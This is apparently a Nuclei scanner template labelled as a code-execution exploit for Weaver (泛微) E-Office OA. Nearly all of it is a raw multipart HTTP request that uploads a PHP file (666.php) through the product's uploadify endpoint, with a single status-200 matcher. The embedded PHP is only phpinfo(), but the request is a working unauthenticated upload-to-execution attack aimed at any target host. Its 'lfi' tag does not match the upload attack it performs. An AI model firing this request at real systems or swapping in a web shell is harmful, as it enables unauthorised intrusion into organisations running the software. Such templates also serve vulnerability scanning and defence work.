id: fanweiOA-Weaver-E-Office9-uploadify-rce

info:
  name: 泛微 OA 代码执行 EXP
  author: cnaq  
  severity: high
  description: 泛微 OA 代码执行 EXP
  reference: 
    - https://docs.qq.com/doc/DWHNoWHFKeVpFWUZG?dver=&_t=1711936000958&u=ef97bcbd4a194029a7cea662016dd789
  tags: fanwei,oa,eweaver,lfi


requests:
  - raw:
      - |
        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Connection: close
        Content-Length: 493
        Accept-Encoding: gzip
        Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85

        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
        Content-Disposition: form-data; name="Filedata"; filename="666.php"
        Content-Type: application/octet-stream

        <?php phpinfo();?>

        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream

        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--


    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
